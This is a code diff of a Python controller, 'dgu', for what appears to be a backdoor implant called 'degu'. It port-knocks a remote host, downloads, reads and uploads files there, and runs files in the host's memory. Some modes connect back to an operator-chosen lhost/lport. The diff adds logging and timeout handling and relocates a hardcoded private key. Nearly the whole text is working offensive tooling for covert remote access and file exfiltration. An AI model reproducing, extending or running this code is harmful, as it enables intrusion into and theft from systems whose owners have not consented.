@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
-
-import docopt
-import random
-import string
-import time
 import sys
+import docopt
+import logging
+import time
 from multiprocessing.pool import ThreadPool
 from degu import degu
 
+PRIVATE_KEY="5802f6d9ec49d04f10473909a6b74a206265311f2c97369144fdb00275d994514056cc619b37690f587fb18a5ec2cf02e2358ccd557cb8b834ccda16483ad2f9"
 
 __doc__="""
 
@@ -22,7 +21,7 @@ Usage:
     dgu cb    <rhost> <lhost> <lport> exe      <lfile> <parameters>
     dgu ghost <rhost> <cmd>
     dgu keygen
-    dgu getpub <priv>
+    dgu getpub 
 
 Examples:
 
@@ -73,18 +72,55 @@ $ ./dgu getpub 2831ff7a13ed00ff1680dcf39dc8669777e269b00862d6160cc4e98ac695276e8
 
 """
 
-PRIVATE_KEY="5802f6d9ec49d04f10473909a6b74a206265311f2c97369144fdb00275d994514056cc619b37690f587fb18a5ec2cf02e2358ccd557cb8b834ccda16483ad2f9"
+
+class LogFmt(logging.Formatter):
+    """ class for log formating """
+
+    def __init__(self):
+        logging.Formatter.__init__(self)
+
+    def format_time(self):
+        """ format time """
+        return time.strftime("%H:%M.%S")
+
+    def _l(self,level):
+        clevel = {"DEBUG"    :  ("\033[0;36m","\033[1;36m"),
+          "INFO"     :  ("\033[0;37m","\033[1;37m"),
+          "WARNING"  :  ("\033[0;31m","\033[1;31m"),
+          "CRITICAL" :  ("\033[0;31m","\033[1;31m"),
+          "ERROR"    :  ("\033[0;31m","\033[1;31m"),
+          }
+        return clevel[level]
+
+    def format(self,record):
+        header = self._l(record.levelname)[0] + "[" + self._l(record.levelname)[1] + "%8s"%record.levelname \
+               + self._l(record.levelname)[1] + "  " + self.format_time() + "][%-5s]: " % record.name + "\033[0m"
+        return header + "\033[0m" + record.msg
+
+LEVEL = logging.DEBUG
+log = logging.getLogger('degu')
+log.setLevel(LEVEL)
+ch = logging.StreamHandler()
+ch.setFormatter(LogFmt())
+log.addHandler(ch)
+
+
 
 if __name__ == "__main__":
     args = docopt.docopt(__doc__)
-    #log.debug(repr(args))
 
     if args['read'] or args['download']:
         if args['bind']:
             d = degu(args['<rhost>'],priv = PRIVATE_KEY)
-            d.knock( b':' + args['<rport>'].encode())
+            if not d.knock( b':' + args['<rport>'].encode()):
+                log.error("knock failed")
+                sys.exit()
             time.sleep(2) # waiting for port to come up on degu
             fil = d.download(args['<rfile>'].encode())
+            if not fil:
+                log.error("no content downloaded")
+                sys.exit()
+
             if args['read']:
                 if fil:
                     print(fil.decode("ascii"))
@@ -101,8 +137,16 @@ if __name__ == "__main__":
             d = degu(args['<rhost>'],priv = PRIVATE_KEY)
             pool = ThreadPool(processes=1)
             async_result = pool.apply_async(d.rdownload, (args['<rfile>'].encode(),args['<lport>']))
-            d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode()))
-            fil = async_result.get()
+            
+            if not d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode())):
+                log.error("knock failed")
+                sys.exit()
+
+            fil = None
+            try:
+                fil = async_result.get()
+            except TimeoutError as e:
+                log.error(f"timeout reached : {e}")
             if fil :
                 if args['read']:
                     print(fil.decode("ascii"))
@@ -116,14 +160,12 @@ if __name__ == "__main__":
                         d.log.error("unable to create %s : %s" % (args['<lfile>'],e))
             del d
 
-
-
-
-            #time.sleep(2)
     if args['upload']:
         if args['bind']:
             d = degu(args['<rhost>'],priv = PRIVATE_KEY)
-            d.knock( b':' + args['<rport>'].encode())
+            if not d.knock( b':' + args['<rport>'].encode()):
+                log.error("knock failed")
+                sys.exit()
             time.sleep(2) # waiting for port to come up on degu
             try:
                 fil = d.upload( args['<lfile>'].encode(), args['<rfile>'].encode() )
@@ -135,16 +177,24 @@ if __name__ == "__main__":
             d = degu(args['<rhost>'],priv = PRIVATE_KEY)
             pool = ThreadPool(processes=1)
             async_result = pool.apply_async(d.rupload, (args['<lfile>'].encode(), args['<rfile>'].encode(),args['<lport>']))
-            d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode()))
-            a = async_result.get()
+            if not d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode())):
+                log.error("knock failed")
+                sys.exit()
+
+            a = None
+            try:
+                a = async_result.get()
+            except TimeoutError as e:
+                log.error(f"timeout reached : {e}")
             if a :
                 print(a.decode("ascii"))
-
 
     if args['exe']:
         if args['bind']:
             d = degu(args['<rhost>'],priv = PRIVATE_KEY)
-            d.knock( b':' + args['<rport>'].encode())
+            if not d.knock( b':' + args['<rport>'].encode()):
+                log.error("knock failed")
+                sys.exit()
             time.sleep(2) # waiting for port to come up on degu
             try:
                 d.mem_exec(args['<lfile>'],args['<parameters>'].encode())
@@ -156,8 +206,14 @@ if __name__ == "__main__":
             d = degu(args['<rhost>'],priv = PRIVATE_KEY)
             pool = ThreadPool(processes=1)
             async_result = pool.apply_async(d.rmem_exec, (args['<lfile>'],args['<parameters>'].encode(),args['<lport>']))
-            d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode()))
-            a = async_result.get()
+            if not d.knock( b'%s:%s' % ( args['<lhost>'].encode() , args['<lport>'].encode())):
+                log.error("knock failed")
+                sys.exit()
+            a = None
+            try:
+                a = async_result.get()
+            except TimeoutError as e:
+                log.error(f"timeout reached : {e}")
             if a :
                 print(a.decode("ascii"))
 
@@ -171,14 +227,4 @@ if __name__ == "__main__":
 
     if args['getpub']:
         d = degu("0",priv = PRIVATE_KEY)
-        import binascii
-        try:
-            priv = binascii.unhexlify(args['<priv>'])
-            if len(priv) != 64:
-                raise ValueError('privkey is not valid')
-            print(degu.getpub(priv))
-        except binascii.Error as e:
-            d.log.error("invalid private key format : %s"%e)
-        except ValueError:
-            d.log.error("invalid private key len ")
-        
+        degu.getpub()
